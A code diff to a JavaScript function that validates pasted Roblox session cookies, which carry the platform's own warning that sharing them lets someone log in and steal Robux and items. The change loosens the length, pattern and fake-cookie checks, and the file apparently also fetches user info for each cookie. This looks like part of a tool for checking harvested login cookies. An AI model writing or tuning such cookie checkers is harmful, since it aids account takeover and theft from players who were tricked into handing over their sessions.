@@ -332,51 +332,47 @@ async function getUserInfo(cookie) {
 
 // Enhanced pattern-based validation (fallback for CORS issues)
 function advancedPatternValidation(cookie) {
-  // Check 1: Must have the FULL warning message
-  const hasFullWarning = cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_');
-  if (!hasFullWarning) {
-    return { valid: false, error: "Invalid cookie format - missing full warning message" };
+  console.log('Using pattern validation fallback...');
+  
+  // Check 1: Must have warning message (flexible check)
+  if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--')) {
+    return { valid: false, error: "Invalid cookie format - missing warning prefix" };
   }
   
-  // Check 2: Extract the token part after |_
+  // Check 2: Must contain the separator |_
+  if (!cookie.includes('|_')) {
+    return { valid: false, error: "Invalid cookie format - missing separator" };
+  }
+  
+  // Check 3: Extract the token part after |_
   const tokenStart = cookie.indexOf('|_') + 2;
-  if (tokenStart < 2) {
-    return { valid: false, error: "Invalid cookie format - no separator found" };
-  }
-  
   const tokenPart = cookie.substring(tokenStart);
   
-  // Check 3: Token must be very long (real tokens are 1400+ chars)
-  if (tokenPart.length < 1400) {
+  // Check 4: Token must be reasonably long (relaxed from 1400 to 800)
+  if (tokenPart.length < 800) {
     return { valid: false, error: "Cookie appears to be truncated or invalid" };
   }
   
-  // Check 4: Token must start with specific pattern
-  if (!tokenPart.match(/^[A-Za-z0-9]{8,12}\./)) {
-    return { valid: false, error: "Invalid cookie format - invalid token pattern" };
+  // Check 5: Token should contain base64-like characters and periods
+  if (!tokenPart.match(/[A-Za-z0-9+\/=._-]/)) {
+    return { valid: false, error: "Invalid cookie format - invalid characters" };
   }
   
-  // Check 5: Must contain multiple long hex sequences
-  const longHexMatches = tokenPart.match(/[A-F0-9]{32,}/g);
-  if (!longHexMatches || longHexMatches.length < 10) {
-    return { valid: false, error: "Invalid cookie format - insufficient complexity" };
-  }
-  
-  // Check 6: Character composition validation
+  // Check 6: Should contain some uppercase letters and numbers (relaxed requirements)
   const upperCaseCount = (tokenPart.match(/[A-Z]/g) || []).length;
   const digitCount = (tokenPart.match(/[0-9]/g) || []).length;
   
-  if (upperCaseCount < 200 || digitCount < 200) {
+  if (upperCaseCount < 20 || digitCount < 20) {
     return { valid: false, error: "Invalid cookie format - insufficient character diversity" };
   }
   
-  // Check 7: Total cookie length
-  if (cookie.length < 1600) {
+  // Check 7: Total cookie length should be reasonable (relaxed from 1600 to 1000)
+  if (cookie.length < 1000) {
     return { valid: false, error: "Cookie appears to be truncated or invalid" };
   }
   
-  // Check 8: Fake pattern detection
-  const fakeIndicators = ['fake', 'test', 'invalid', 'example', 'demo', 'sample', 'placeholder', 'xxx', 'aaa', '111'];
+  // Check 8: Basic fake pattern detection (common fake indicators)
+  const fakeIndicators = ['fakecookie', 'testcookie', 'example123', 'demo', 'sample123'];
   const lowerCookie = cookie.toLowerCase();
   for (const fake of fakeIndicators) {
     if (lowerCookie.includes(fake)) {
@@ -384,11 +380,12 @@ function advancedPatternValidation(cookie) {
     }
   }
   
-  // Check 9: Repeating pattern detection
-  if (tokenPart.includes('AAAA') || tokenPart.includes('1111') || tokenPart.includes('0000')) {
-    return { valid: false, error: "Invalid cookie - contains repeating patterns" };
+  // Check 9: Detect obvious repeating patterns (relaxed check)
+  if (tokenPart.includes('AAAAAAA') || tokenPart.includes('1111111') || tokenPart.includes('0000000')) {
+    return { valid: false, error: "Invalid cookie - contains obvious repeating patterns" };
   }
   
+  console.log('Pattern validation passed!');
   return { valid: true, error: null };
 }
 
